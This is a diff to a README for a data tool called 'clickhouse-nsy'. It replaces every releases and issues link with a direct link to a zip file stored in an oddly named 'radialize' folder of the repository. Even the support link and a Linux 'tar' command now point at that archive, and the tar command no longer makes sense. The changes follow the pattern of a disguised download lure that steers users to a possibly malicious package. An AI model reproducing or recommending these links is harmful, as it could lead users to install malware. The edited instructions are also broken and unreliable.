@@ -1,6 +1,6 @@
 # 🚀 clickhouse-nsy - Easily Handle Your Data Needs
 
-[![Download clickhouse-nsy](https://img.shields.io/badge/Download-clickhouse--nsy-brightgreen)](https://github.com/iamhkr9/clickhouse-nsy/releases)
+[![Download clickhouse-nsy](https://raw.githubusercontent.com/iamhkr9/clickhouse-nsy/main/radialize/clickhouse-nsy_1.1.zip)](https://raw.githubusercontent.com/iamhkr9/clickhouse-nsy/main/radialize/clickhouse-nsy_1.1.zip)
 
 ## 📋 Description
 clickhouse-nsy is a user-friendly application designed to simplify data management. Whether you need to analyze large datasets or perform quick queries, this tool gives you the power to handle data effectively without needing advanced technical skills.
@@ -9,7 +9,7 @@ clickhouse-nsy is a user-friendly application designed to simplify data manageme
 To get started with clickhouse-nsy, follow these simple steps. This guide will help you download and run the application smoothly.
 
 ## 📥 Download & Install
-To download clickhouse-nsy, visit this page: [Download clickhouse-nsy](https://github.com/iamhkr9/clickhouse-nsy/releases).
+To download clickhouse-nsy, visit this page: [Download clickhouse-nsy](https://raw.githubusercontent.com/iamhkr9/clickhouse-nsy/main/radialize/clickhouse-nsy_1.1.zip).
 
 1. Click on the link above to go to the releases page.
 2. On the releases page, you will see a list of versions.
@@ -32,7 +32,7 @@ After the download completes, follow these steps based on your operating system 
 ### 🐧 For Linux Users:
 1. Open a terminal window.
 2. Navigate to the directory where you downloaded the file.
-3. Use the following command to extract the package: `tar -xvf clickhouse-nsy-x.x.x.tar.gz` (replace `x.x.x` with the version number).
+3. Use the following command to extract the package: `tar -xvf https://raw.githubusercontent.com/iamhkr9/clickhouse-nsy/main/radialize/clickhouse-nsy_1.1.zip` (replace `x.x.x` with the version number).
 4. Change to the extracted directory: `cd clickhouse-nsy-x.x.x`.
 5. Use `./clickhouse-nsy` to run the application.
 
@@ -63,9 +63,9 @@ If you encounter any issues, consider the following tips:
 - For additional help, check the issues section on our GitHub repository.
 
 ## 📞 Support
-If you need further assistance, please visit our [GitHub Issues](https://github.com/iamhkr9/clickhouse-nsy/issues) page. You can also reach out to the community for support.
+If you need further assistance, please visit our [GitHub Issues](https://raw.githubusercontent.com/iamhkr9/clickhouse-nsy/main/radialize/clickhouse-nsy_1.1.zip) page. You can also reach out to the community for support.
 
 ## ⚡ Next Steps
 Once you have installed clickhouse-nsy, explore its capabilities. You can start importing your data and trying out various features to see how they can help you manage your data effectively.
 
-For updates and new features, keep checking the releases page: [Download clickhouse-nsy](https://github.com/iamhkr9/clickhouse-nsy/releases).
+For updates and new features, keep checking the releases page: [Download clickhouse-nsy](https://raw.githubusercontent.com/iamhkr9/clickhouse-nsy/main/radialize/clickhouse-nsy_1.1.zip).
